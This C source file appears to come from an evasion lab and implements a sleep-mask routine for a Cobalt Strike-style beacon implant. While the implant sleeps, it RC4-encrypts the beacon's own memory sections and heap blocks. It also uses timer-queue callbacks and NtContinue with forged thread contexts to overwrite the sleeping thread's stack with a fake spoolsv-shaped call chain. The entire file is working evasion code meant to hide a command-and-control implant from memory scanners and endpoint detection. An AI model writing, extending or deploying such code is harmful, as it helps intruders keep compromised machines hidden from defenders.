/* Phase 1 Gen3 sleep chain - see sleepmask_gen3.h.
 *
 * Callstack-spoof mechanism ported from Cobalt-Strike/CallStackMasker
 * (evasion-lab/reference/CallStackMasker-main, @joehowwolf, Ekko-derived):
 * four CreateTimerQueueTimer entries drive NtContinue with forged CONTEXTs
 * on the timer thread - backup the real stack, plant the fake spoolsv-
 * shaped stack over the sleeping thread's frames, restore, and SetEvent.
 * The main thread waits on that event, so its exposed stack and wait
 * reason are the spoofed ones for the entire window. */
#include "sleepmask_gen3.h"

#define G3_ROP_OFF  /* stage 1a acceptance run; revert for the ROP timing round */

#if defined(_M_X64)

#include <windows.h>
#include <intrin.h>
#include <string.h>
#include <stdlib.h>
#include "beacon.h"
#include "gargleint.h"
#include "track_memory.h"

/* ---------------- RC4 via advapi32!SystemFunction032 ---------------- */

typedef struct _G3_USTRING {
	ULONG Length;
	ULONG MaximumLength;
	PUCHAR Buffer;
} G3_USTRING;

typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key); /* advapi32 SystemFunction032 = RtlEncryptDecryptRC4, returns NTSTATUS (LONG) */

/* ---- temporary bisect probe (remove after diagnosis) ----
 *
 * Round 12 root cause: g3_log("ROP window served") ran BETWEEN mask and
 * unmask, so its CreateFileA went through the .rdata IAT - ciphertext.
 * RVA proof: crash insn 0x150CA -> thunk slot 0x312F0 = kernel32!
 * CreateFileA, the only CreateFileA caller in the image is g3_log.
 * Fix: every file op used anywhere inside the window goes through G3_IO -
 * kernel32 pointers + path copied ONCE at init, carried on the stack via
 * G3_MASKCTX. g3_log (string form) stays for outside-window lines and
 * falls back to direct calls when init has not populated the cache. */

typedef struct {
	HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
	BOOL   (WINAPI *pWriteFile)(HANDLE, const void *, DWORD, DWORD *, void *);
	BOOL   (WINAPI *pCloseHandle)(HANDLE);
	char   path[64];
	int    ok;
} G3_IO;

static G3_IO g_io;

void g3_log(const char * msg, long v)
{
	/* only ever called outside the masked window - reading the g_io copy
	 * of .data and any CRT/IAT route is fine here */
	HANDLE f;
	char buf[96];
	int i = 0;
	const char * p = msg;

	if (g_io.ok)
		f = g_io.pCreateFileA(g_io.path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		                      OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	else
		f = CreateFileA("C:\\Users\\Public\\gen3_trace.txt", FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return;
	while (*p && i < 70) buf[i++] = *p++;
	if (v != 0x7fffffff) {
		char num[16];
		int n = 0;
		long t = v;
		if (t < 0) { buf[i++] = '-'; t = -t; }
		do { num[n++] = (char)('0' + (t % 10)); t /= 10; } while (t);
		while (n && i < 90) buf[i++] = num[--n];
	}
	buf[i++] = '\r';
	buf[i++] = '\n';
	if (g_io.ok) {
		g_io.pWriteFile(f, buf, (DWORD)i, NULL, NULL);
		g_io.pCloseHandle(f);
	}
	else {
		WriteFile(f, buf, (DWORD)i, NULL, NULL);
		CloseHandle(f);
	}
}

/* Numeric tracing for the masked span: line is built purely on this stack
 * frame (no .rdata literals), file ops come from the caller's G3_IO copy
 * (stack), so nothing here touches beacon .data/.rdata while they are
 * ciphertext. Format: "<tag> <a-decimal> <b-hex16> <c-hex16>". */
static void g3_log_n(const G3_IO * io, char tag, unsigned int a, unsigned long long b, unsigned long long c)
{
	char buf[64];
	int i = 0;
	unsigned long long vals[2];
	int f2, s;
	HANDLE f;

	if (io == NULL || !io->ok)
		return;
	buf[i++] = tag;
	buf[i++] = ' ';
	{
		char num[12];
		int n = 0;
		unsigned int t = a;
		if (t == 0)
			num[n++] = '0';
		while (t) {
			num[n++] = (char)('0' + (t % 10));
			t /= 10;
		}
		while (n && i < 40) buf[i++] = num[--n];
	}
	vals[0] = b;
	vals[1] = c;
	for (f2 = 0; f2 < 2; f2++) {
		buf[i++] = ' ';
		for (s = 60; s >= 0; s -= 4) {
			unsigned int nib = (unsigned int)((vals[f2] >> s) & 0xf);
			buf[i++] = (char)(nib < 10 ? ('0' + nib) : ('A' + nib - 10));
		}
	}
	buf[i++] = '\r';
	buf[i++] = '\n';
	f = io->pCreateFileA(io->path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
	                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return;
	io->pWriteFile(f, buf, (DWORD)i, NULL, NULL);
	io->pCloseHandle(f);
}

/* FNV-1a over a block: pure arithmetic over the block bytes, legal to run
 * on plaintext (before mask), ciphertext (inside window) and restored
 * plaintext (after unmask) alike. */
static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
{
	unsigned long long h = 0xcbf29ce484222325ULL;
	while (len--) {
		h ^= (unsigned long long)*p++;
		h *= 0x100000001b3ULL;
	}
	return h;
}

static G3_SF032 g_sf032;

/* RC4 is a stream cipher: running it twice with the same key restores the
 * plaintext, so one routine serves as both encrypt and decrypt. Each block
 * derives its own key (16B key XOR'd with the block counter) so two blocks
 * never share a keystream. No CRT calls in here on purpose: the loop body
 * runs while .rdata (IAT) is ciphertext (the 16B copies inline today, but
 * explicit loops keep that true under any optimizer). */
static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
{
	unsigned char k[16];
	G3_USTRING d, kk;
	int j;

	for (j = 0; j < 16; j++)
		k[j] = key[j];
	k[0] ^= (unsigned char)ctr;
	k[1] ^= (unsigned char)(ctr >> 8);
	kk.Buffer = k;
	kk.Length = kk.MaximumLength = 16;

	d.Buffer = buf;
	d.Length = d.MaximumLength = len;

	fn(&d, &kk);
	for (j = 0; j < 16; j++)
		k[j] = 0;
}

/* Snapshot of the block list, taken before any region is touched: masking
 * .data corrupts gparms (which points into .data) and the heap_records
 * array (in .bss) mid-walk, so the walk itself must run off local copies. */
#define G3_MAX_BLOCKS 300

typedef struct {
	unsigned char * ptr;
	unsigned long len;
} G3_BLOCK;

static int g3_snapshot_blocks(G3_BLOCK * out, int max)
{
	GARGLEP parms = *gparms;
	HEAP_RECORD * hr = track_memory_get_heap_records_to_mask();
	DWORD * sec;
	int n = 0;
	DWORD text_va = 0, text_end = 0;

	g3_log("snap: beacon_ptr", (long)(long long)parms.beacon_ptr);
	g3_log("snap: sections", (long)(long long)parms.sections);
	g3_log("snap: hr", (long)(long long)hr);
	{
		DWORD lf = *(DWORD *)((unsigned char *)parms.beacon_ptr + 0x3C);
		g3_log("snap: lfanew", (long)lf);
	}

	/* The mask engine (this code) lives in beacon .text: an in-place
	 * encrypt of .text would encrypt our own return path mid-call. The
	 * official sleepmask BOF survives masking .text only because the BOF
	 * executes from outside the image; covering .text the same way needs
	 * this engine copied to a private page (follow-up). Until then .text
	 * is excluded from the Gen3 range - parse our own PE header for its
	 * extent (the header page itself is data, still masked). */
	{
		unsigned char * pe = (unsigned char *)parms.beacon_ptr;
		DWORD lfanew = *(DWORD *)(pe + 0x3C);
		WORD nsec = *(WORD *)(pe + lfanew + 6);
		WORD optsz = *(WORD *)(pe + lfanew + 20);
		DWORD secoff = lfanew + 24 + optsz;
		WORD i;
		for (i = 0; i < nsec; i++) {
			unsigned char * so = pe + secoff + (DWORD)i * 40;
			if (memcmp(so, ".text", 5) == 0) {
				DWORD vsz = *(DWORD *)(so + 8);
				text_va = *(DWORD *)(so + 12);
				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
				break;
			}
		}
	}

	g3_log("snap: text_va", (long)text_va);
	g3_log("snap: text_end", (long)text_end);
	sec = (DWORD *)parms.sections;
	if (sec != NULL) {
		while (n + 1 < max) {
			DWORD a = sec[0], b = sec[1];
			if (a == 0 && b == 0)
				break;
			if (b > a) {
				BOOL overlaps_text = (a < text_end && b > text_va);
				if (!overlaps_text) {
					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
					out[n].len = b - a;
					n++;
				}
				else if (a < text_va) {
					/* keep the part below .text (header page) */
					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
					out[n].len = text_va - a;
					n++;
				}
			}
			sec += 2;
		}
	}

	while (n < max && hr != NULL && hr->ptr != NULL) {
		if (hr->size > 0 && hr->size < 0x40000000) {
			out[n].ptr = (unsigned char *)hr->ptr;
			out[n].len = (unsigned long)hr->size;
			n++;
		}
		hr++;
	}

	return n;
}

/* ---------------- static fake callstack (spoolsv waiting shape) ------- */

typedef struct {
	const char * dll;
	const char * func;
	DWORD offset;      /* return-address offset inside the function */
	DWORD stack_size;  /* filled from unwind info at init */
	unsigned __int64 retaddr;
} G3_FRAME;

static G3_FRAME g_frames[4] = {
	{ "kernelbase.dll", "WaitForSingleObjectEx",   0x8e, 0, 0 },
	{ "localspl.dll",   "InitializePrintMonitor2", 0xb7a, 0, 0 },
	{ "kernel32.dll",   "BaseThreadInitThunk",     0x14, 0, 0 },
	{ "ntdll.dll",      "RtlUserThreadStart",      0x21, 0, 0 },
};

static unsigned char * g_scratch;   /* one private page: fake stack + backup */
static unsigned char * g_fakestack;
static unsigned char * g_backup;
static unsigned long g_stack_bytes;
static BOOL g_inited;

/* UNWIND_CODE is a USHORT: low byte CodeOffset, high byte packs
 * UnwindOp (bits 8-11) and OpInfo (bits 12-15). */
#define G3_UNWOP(slot)   ((((unsigned)(slot)) >> 8) & 0xf)
#define G3_OPINFO(slot)  ((((unsigned)(slot)) >> 12) & 0xf)

typedef struct {
	unsigned char VersionFlags; /* low 3 bits version, high 5 flags */
	unsigned char SizeOfProlog;
	unsigned char CountOfCodes;
	unsigned char FrameRegOff;  /* low nibble frame reg, high nibble offset */
	unsigned short codes[1];
} G3_UNWIND_INFO;

#define G3_UWOP_PUSH_NONVOL     0
#define G3_UWOP_ALLOC_LARGE     1
#define G3_UWOP_ALLOC_SMALL     2
#define G3_UWOP_SET_FPREG       3
#define G3_UWOP_SAVE_NONVOL     4
#define G3_UWOP_SAVE_NONVOL_FAR 5
#define G3_UWOP_SAVE_XMM128     8
#define G3_UWOP_SAVE_XMM128_FAR 9
#define G3_UWOP_PUSH_MACHFRAME  10
#define G3_UNW_FLAG_CHAININFO   0x4 /* flags nibble; E/UHANDLER (0x1/0x2) only add a handler pointer we ignore */

typedef PRUNTIME_FUNCTION(WINAPI *G3_LOOKUP)(DWORD64, PDWORD64, void *);
static G3_LOOKUP g_lookup;

/* Walk one RUNTIME_FUNCTION's unwind codes and sum the stack slots its
 * prologue claims (CallStackMasker's CalculateFunctionStackSize, trimmed
 * to the op set the default spoolsv shape actually uses). add_ret counts
 * the return-address slot; chained entries merge in without it. */
static BOOL g3_walk(PRUNTIME_FUNCTION rf, unsigned __int64 base, DWORD * out, BOOL add_ret)
{
	G3_UNWIND_INFO * ui;
	DWORD size = add_ret ? 8 : 0;
	int i;

	ui = (G3_UNWIND_INFO *)((char *)base + rf->UnwindData);
	i = 0;
	while (i < ui->CountOfCodes) {
		unsigned short slot = ui->codes[i];
		switch (G3_UNWOP(slot)) {
		case G3_UWOP_PUSH_NONVOL:
			size += 8;
			break;
		case G3_UWOP_ALLOC_SMALL:
			size += (G3_OPINFO(slot) * 8) + 8;
			break;
		case G3_UWOP_ALLOC_LARGE: {
			unsigned char kind = (unsigned char)G3_OPINFO(slot);
			i++;
			if (kind == 0) {
				size += (DWORD)ui->codes[i] * 8;
			}
			else {
				size += (DWORD)ui->codes[i] + ((DWORD)ui->codes[i + 1] << 16);
				i++;
			}
			break;
		}
		case G3_UWOP_SET_FPREG:
			break;
		case G3_UWOP_SAVE_NONVOL:
			i++;
			break;
		case G3_UWOP_SAVE_NONVOL_FAR:
			i += 2;
			break;
		case G3_UWOP_SAVE_XMM128:
			i++;
			break;
		case G3_UWOP_SAVE_XMM128_FAR:
			i += 2;
			break;
		default:
			return FALSE;
		}
		i++;
	}

	if (((ui->VersionFlags >> 3) & G3_UNW_FLAG_CHAININFO) != 0) {
		/* the chained RUNTIME_FUNCTION sits right after the (evened-up)
		 * unwind code array; merge its slots, without its return slot */
		int cnt = ui->CountOfCodes;
		if (cnt & 1)
			cnt++;
		{
			PRUNTIME_FUNCTION chain = (PRUNTIME_FUNCTION)((unsigned char *)ui->codes + cnt * 2);
			DWORD sub = 0;
			if (!g3_walk(chain, base, &sub, FALSE))
				return FALSE;
			size += sub;
		}
	}

	*out = size;
	return TRUE;
}

static BOOL g3_frame_size(unsigned __int64 addr, DWORD * out)
{
	unsigned __int64 base = 0;
	PRUNTIME_FUNCTION rf = g_lookup(addr, &base, NULL);
	if (rf == NULL)
		return FALSE;
	return g3_walk(rf, base, out, TRUE);
}

static BOOL g3_init(void)
{
	HMODULE mod;
	int i;

	g_sf032 = (G3_SF032)GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction032");
	if (g_sf032 == NULL) { g3_log("init: no SystemFunction032", 0); return FALSE; }

	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
	if (g_lookup == NULL) { g3_log("init: no RtlLookupFunctionEntry", 0); return FALSE; }

	/* trace IO cache - filled once, used by every logger (also inside the
	 * masked window, via the G3_MASKCTX copy) */
	{
		HMODULE k32 = GetModuleHandleA("kernel32.dll");
		const char * src = "C:\\Users\\Public\\gen3_trace.txt";
		char * dst = g_io.path;
		g_io.pCreateFileA = (HANDLE (WINAPI *)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE))
			GetProcAddress(k32, "CreateFileA");
		g_io.pWriteFile = (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, void *))
			GetProcAddress(k32, "WriteFile");
		g_io.pCloseHandle = (BOOL (WINAPI *)(HANDLE))GetProcAddress(k32, "CloseHandle");
		while (*src && (dst - g_io.path) < 60)
			*dst++ = *src++;
		*dst = 0;
		g_io.ok = (g_io.pCreateFileA != NULL && g_io.pWriteFile != NULL && g_io.pCloseHandle != NULL && g_sf032 != NULL);
	}

	/* resolve every frame's return address; localspl is not loaded in the
	 * average carrier process, so pull it in once (the module-load event
	 * is the accepted cost of the official spoolsv shape) */
	for (i = 0; i < 4; i++) {
		FARPROC fn;
		mod = GetModuleHandleA(g_frames[i].dll);
		if (mod == NULL) {
			mod = LoadLibraryA(g_frames[i].dll);
			if (mod == NULL)
				return FALSE;
		}
		fn = GetProcAddress(mod, g_frames[i].func);
		if (fn == NULL) { g3_log("init: no func ", 100 + i); return FALSE; }
		g_frames[i].retaddr = (unsigned __int64)fn + g_frames[i].offset;
		if (!g3_frame_size(g_frames[i].retaddr, &g_frames[i].stack_size)) { g3_log("init: frame size fail ", 200 + i); return FALSE; }
	}

	g_stack_bytes = 8; /* trailing NULL stops the unwind */
	for (i = 0; i < 4; i++)
		g_stack_bytes += g_frames[i].stack_size;
	if (g_stack_bytes > 0x800) { g3_log("init: stack bytes too big", (long)g_stack_bytes); return FALSE; }

	g_scratch = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_scratch == NULL)
		return FALSE;
	g_fakestack = g_scratch;
	g_backup = g_scratch + 0x800;

	/* lay out the fake frame chain: return address at each frame's
	 * Child-SP, spaced by that frame's stack size */
	{
		unsigned char * p = g_fakestack;
		for (i = 0; i < 4; i++) {
			*(unsigned __int64 *)p = g_frames[i].retaddr;
			p += g_frames[i].stack_size;
		}
		*(unsigned __int64 *)p = 0;
	}

	g_inited = TRUE;
	return TRUE;
}

/* ---------------- the timer ROP chain ---------------- */

__declspec(noinline) static void * g3_child_sp(void)
{
	/* Child-SP of this frame: one slot above our own return address */
	return (char *)_AddressOfReturnAddress() + 8;
}

typedef void(WINAPI *G3_NTCONTINUE)(void *, unsigned char);

/* mask callback contract: runs between arming and waiting (i.e. after
 * every window API is resolved, before any IAT dependence would matter) */
typedef void (*G3_MASKFN)(void * ctx);

/* the window: single function so ChildSP is taken in the frame that will
 * actually wait (bisect-C proved this position; taking it in a shallower
 * prepare-frame shifts the overwrite span onto live frames). */
static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
{
	CONTEXT cap;
	CONTEXT rop_backup, rop_spoof, rop_restore, rop_event;
	HANDLE queue = NULL;
	HANDLE timer = NULL;
	HANDLE event = NULL;
	void * (*pmemcpy)(void *, const void *, size_t);
	G3_NTCONTINUE pcontinue;
	void * (WINAPI *pwait)(HANDLE, DWORD);
	void * childsp;
	unsigned char * rsp_at_wait;
	BOOL ok = FALSE;

#if defined(G3_ROP_OFF)
	/* stage 1a: no timers at all - the ROP beats would stomp a plain
	 * sleeping thread's stack (spoof at 300ms vs wake at `time`) */
	{
		void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
			GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
		if (psleep == NULL)
			return FALSE;
		maskfn(ctx);
		psleep(time);
		return TRUE;
	}
#else
	pmemcpy = (void *(*)(void *, const void *, size_t))
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
	pcontinue = (G3_NTCONTINUE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	pwait = (void *(WINAPI *)(HANDLE, DWORD))
		GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");
	if (pmemcpy == NULL || pcontinue == NULL || pwait == NULL)
		return FALSE;

	queue = CreateTimerQueue();
	event = CreateEventW(NULL, FALSE, FALSE, NULL);
	if (queue == NULL || event == NULL)
		goto done;

	memset(&cap, 0, sizeof(cap));
	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)RtlCaptureContext, &cap, 0, 0,
	                            WT_EXECUTEINTIMERTHREAD))
		goto done;
	WaitForSingleObject(event, 0x32);

	/* ChildSP of THIS frame - the frame that will wait below */
	childsp = g3_child_sp();
	rsp_at_wait = (unsigned char *)childsp - g_frames[0].stack_size - 0x8;

	memcpy(&rop_backup, &cap, sizeof(CONTEXT));
	memcpy(&rop_spoof, &cap, sizeof(CONTEXT));
	memcpy(&rop_restore, &cap, sizeof(CONTEXT));
	memcpy(&rop_event, &cap, sizeof(CONTEXT));

	rop_backup.Rsp -= 8;
	rop_backup.Rip = (DWORD64)pmemcpy;
	rop_backup.Rcx = (DWORD64)g_backup;
	rop_backup.Rdx = (DWORD64)rsp_at_wait;
	rop_backup.R8 = g_stack_bytes;

	rop_spoof.Rsp -= 8;
	rop_spoof.Rip = (DWORD64)pmemcpy;
	rop_spoof.Rcx = (DWORD64)rsp_at_wait;
	rop_spoof.Rdx = (DWORD64)g_fakestack;
	rop_spoof.R8 = g_stack_bytes;

	rop_restore.Rsp -= 8;
	rop_restore.Rip = (DWORD64)pmemcpy;
	rop_restore.Rcx = (DWORD64)rsp_at_wait;
	rop_restore.Rdx = (DWORD64)g_backup;
	rop_restore.R8 = g_stack_bytes;

	rop_event.Rsp -= 8;
	rop_event.Rip = (DWORD64)SetEvent;
	rop_event.Rcx = (DWORD64)event;

	/* arm everything with lead time for the mask pass, THEN mask, THEN
	 * wait: no API (and no IAT touch) between mask and unmask */
	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_backup, 150, 0,
	                            WT_EXECUTEINTIMERTHREAD))
		goto done;
	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_spoof, 300, 0,
	                            WT_EXECUTEINTIMERTHREAD))
		goto done;
	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_restore, time + 600 - 10, 0,
	                            WT_EXECUTEINTIMERTHREAD))
		goto done;
	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_event, time + 600, 0,
	                            WT_EXECUTEINTIMERTHREAD))
		goto done;

	/* from here until the wait returns: no API, no static data reads -
	 * the IAT (.rdata) and .data are ciphertext for this whole span */
	maskfn(ctx);
	pwait(event, INFINITE);
	ok = TRUE;

done:
	if (queue != NULL)
		DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE);
	if (event != NULL)
		CloseHandle(event);
	return ok;
#endif
}

/* ---------------- entry ---------------- */

typedef struct {
	G3_BLOCK * blocks;
	int nblocks;
	unsigned char key[16];
	G3_SF032 fn; /* cached pre-mask: .data (holding g_sf032) is ciphertext until unmask completes */
	G3_IO io;    /* cached pre-mask: trace file ops must not go through the IAT */
} G3_MASKCTX;

static void g3_mask_all_cb(void * vctx)
{
	G3_MASKCTX * m = (G3_MASKCTX *)vctx;
	/* Everything this loop touches is stack (ctx) or register: fn/key from
	 * m, block list from m->blocks (caller's stack array), tracing through
	 * m->io. g_sf032/.data is ciphertext once a block covers it - never
	 * read it from here. */
	int i, n = m->nblocks;

	for (i = 0; i < n; i++) {
		g3_rc4(m->fn, m->blocks[i].ptr, m->blocks[i].len, m->key, (unsigned int)i);
		g3_log_n(&m->io, 'm', (unsigned int)i, g3_chk(m->blocks[i].ptr, m->blocks[i].len), 0);
	}
	g3_log_n(&m->io, 'x', 0, 0, 0);
}

BOOL gen3_sleep(DWORD time)
{
	unsigned char key[16];
	G3_BLOCK blocks[G3_MAX_BLOCKS];
	G3_MASKCTX mctx;
	int nblocks;
	int i;

	g3_log("sleep: enter", 0x7fffffff);
	/* gparms is initialized lazily by the official BOF path (boff.cpp) or
	 * the trampoline - both run AFTER gen3 in GargleSleep. Without this
	 * the snapshot dereferences a NULL gparms. No exclusion span: .text
	 * is already excluded explicitly in g3_snapshot_blocks. */
	if (gparms == NULL)
		gargle_setup_parms(NULL, NULL, 0);
	if (!g_inited && !g3_init()) {
		g3_log("sleep: init failed -> caller falls back", 0x7fffffff);
		return FALSE;
	}
	g3_log("sleep: init ok, stack bytes", (long)g_stack_bytes);

	{
		unsigned int * k = (unsigned int *)key;
		for (i = 0; i < 4; i++)
			k[i] = bigger_rand();
	}

	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
	g3_log("sleep: nblocks", nblocks);

	mctx.blocks = blocks;
	mctx.nblocks = nblocks;
	for (i = 0; i < 16; i++)
		mctx.key[i] = key[i];
	mctx.fn = g_sf032;
	mctx.io = g_io; /* struct copy pre-mask; the window uses only this copy */

	/* block map + plaintext checksums (C is what every later phase must
	 * reproduce: 'm' must differ, 'U' must equal 'C') */
	for (i = 0; i < nblocks; i++) {
		g3_log_n(&mctx.io, 'B', (unsigned int)i, (unsigned long long)(size_t)blocks[i].ptr, blocks[i].len);
		g3_log_n(&mctx.io, 'C', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
	}
	{
		unsigned long long k0 = 0, k1 = 0;
		for (i = 0; i < 8; i++) {
			k0 |= ((unsigned long long)key[i]) << (8 * i);
			k1 |= ((unsigned long long)key[8 + i]) << (8 * i);
		}
		g3_log_n(&mctx.io, 'K', 0, k0, k1);
		g3_log_n(&mctx.io, 'F', 0, (unsigned long long)(size_t)mctx.fn, (unsigned long long)nblocks);
	}

	if (!g3_stack_spoof_sleep(time, g3_mask_all_cb, &mctx)) {
		g3_log("sleep: window failed -> fallback", 0x7fffffff);
		return FALSE;
	}
	/* still masked here - pointer-ized line only (round 12 fix) */
	g3_log_n(&mctx.io, 'w', 0, 0, 0);

	/* RC4 twice with the same key restores the plaintext. The fn pointer
	 * MUST come from the pre-mask cache: reading g_sf032 now would load
	 * ciphertext (it lives in .data, still masked at this point). The
	 * per-block 'u'/'U' lines make the round trip auditable: u == m,
	 * U == C for every block. */
	for (i = 0; i < nblocks; i++) {
		g3_log_n(&mctx.io, 'u', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
		g3_log_n(&mctx.io, 'U', (unsigned int)i, g3_chk(blocks[i].ptr, blocks[i].len), 0);
	}
	g3_log_n(&mctx.io, 'D', 0, 0, 0);

	/* post-unmask: everything is plaintext again, plain loops still */
	for (i = 0; i < 16; i++)
		key[i] = 0;
	for (i = 0; i < (int)sizeof(mctx); i++)
		((unsigned char *)&mctx)[i] = 0;
	return TRUE;
}

#endif /* _M_X64 */
